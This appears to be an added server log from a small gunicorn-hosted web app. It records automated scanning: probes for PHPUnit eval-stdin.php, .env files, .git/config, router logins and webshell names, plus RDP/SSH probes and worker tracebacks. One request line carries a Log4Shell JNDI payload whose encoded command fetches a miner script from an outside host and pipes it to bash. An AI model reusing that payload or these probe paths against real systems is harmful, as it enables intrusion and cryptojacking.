+Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
+Not Found: /phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /phpunit/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
+Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /index.php
+Not Found: /public/index.php
+Not Found: /index.php
+Not Found: /index.php
+Not Found: /containers/json
+Not Found: /boaform/admin/formLogin
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /sM6f
+Not Found: /f2Sr
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /aab8
+[2025-06-06 17:02:54 +0800] [2137576] [WARNING] Invalid request from ip=3.131.215.38: Invalid HTTP request line: 'SSH-2.0-Go'
+Not Found: /f2Sr
+Not Found: /boaform/admin/formLogin
+[2025-06-06 17:49:08 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2137576)
+[2025-06-06 17:49:08 +0800] [2137576] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 269, in parse
+    self.get_data(unreader, buf, stop=True)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-06 17:49:08 +0800] [2137576] [INFO] Worker exiting (pid: 2137576)
+[2025-06-06 17:49:08 +0800] [2229837] [INFO] Booting worker with pid: 2229837
+Not Found: /aab9
+Not Found: /favicon.ico
+Not Found: /HNAP1/
+Not Found: /_profiler/phpinfo
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Not Found: /userRpmNatDebugRpm26525557/start_art.html
+Not Found: /v1/models
+Not Found: /boaform/admin/formLogin
+Not Found: /login
+Not Found: /.env
+Not Found: /userRpmNatDebugRpm26525557/start_art.html
+Not Found: /.env
+Not Found: /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.15.17.128:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC43OC4xNjMvc2NyaXB0cy80dGhlcG9vbF9taW5lci5zaCB8IGJhc2ggLXM7IHdnZXQgLXFPLSBodHRwOi8vNDYuOC43OC4xNjMvc2NyaXB0cy80dGhlcG9vbF9taW5lci5zaCB8IGJhc2ggLXM=}')
+Not Found: /v1/models
+[2025-06-07 01:04:35 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2229837)
+[2025-06-07 01:04:35 +0800] [2229837] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-07 01:04:35 +0800] [2229837] [INFO] Worker exiting (pid: 2229837)
+[2025-06-07 01:04:35 +0800] [2364827] [INFO] Booting worker with pid: 2364827
+[2025-06-07 01:07:13 +0800] [2364827] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /hudson
+Not Found: /boaform/admin/formLogin
+Not Found: /developmentserver/metadatauploader
+Not Found: /ping.js
+Not Found: /_static/.env
+Not Found: /_profiler/phpinfo
+Not Found: /boaform/admin/formLogin
+[2025-06-07 04:54:16 +0800] [2364827] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /_profiler/phpinfo
+[2025-06-07 06:54:05 +0800] [2364827] [WARNING] Invalid request from ip=91.238.181.94: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.git/config
+Not Found: /.env
+Not Found: /boaform/admin/formLogin
+Not Found: /favicon.ico
+[2025-06-07 10:12:26 +0800] [2364827] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-06-07 10:12:26 +0800] [2364827] [INFO] Worker exiting (pid: 2364827)
+[2025-06-07 10:12:26 +0800] [3846911] [ERROR] Worker (pid:2364827) exited with code 255
+[2025-06-07 10:12:26 +0800] [3846911] [ERROR] Worker (pid:2364827) exited with code 255.
+[2025-06-07 10:12:26 +0800] [2533860] [INFO] Booting worker with pid: 2533860
+Not Found: /favicon.ico
+[2025-06-07 10:13:39 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2533860)
+[2025-06-07 10:13:39 +0800] [2533860] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-07 10:13:39 +0800] [2533860] [INFO] Worker exiting (pid: 2533860)
+[2025-06-07 10:13:39 +0800] [2534236] [INFO] Booting worker with pid: 2534236
+Not Found: /wiki
+[2025-06-07 10:14:13 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2534236)
+[2025-06-07 10:14:13 +0800] [2534236] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-07 10:14:13 +0800] [2534236] [INFO] Worker exiting (pid: 2534236)
+[2025-06-07 10:14:13 +0800] [2534405] [INFO] Booting worker with pid: 2534405
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /boaform/admin/formLogin
+[2025-06-07 12:28:51 +0800] [2534405] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /boaform/admin/formLogin
+Not Found: /robots.txt
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+Not Found: /security.txt
+[2025-06-07 13:41:21 +0800] [2534405] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-07 14:51:02 +0800] [2534405] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /get_params.cgi
+Not Found: /JApa
+Not Found: /c1Rw
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /t4
+Not Found: /1.php
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+[2025-06-07 16:20:37 +0800] [2534405] [WARNING] Invalid request from ip=3.143.33.63: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-06-07 16:29:03 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2534405)
+[2025-06-07 16:29:03 +0800] [2534405] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-07 16:29:03 +0800] [2534405] [INFO] Worker exiting (pid: 2534405)
+[2025-06-07 16:29:03 +0800] [2649984] [INFO] Booting worker with pid: 2649984
+Not Found: /DoRW
+Not Found: /BxVM
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /qctv.fengshows.cn/live/0701pin72.flv
+Not Found: /v1/models
+Not Found: /boaform/admin/formLogin
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /mobilelive-play.ysp.cctv.cn/ysp/2013693901.m3u8
+Not Found: /boaform/admin/formLogin
+[2025-06-07 19:49:40 +0800] [2649984] [WARNING] Invalid request from ip=45.142.193.132: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
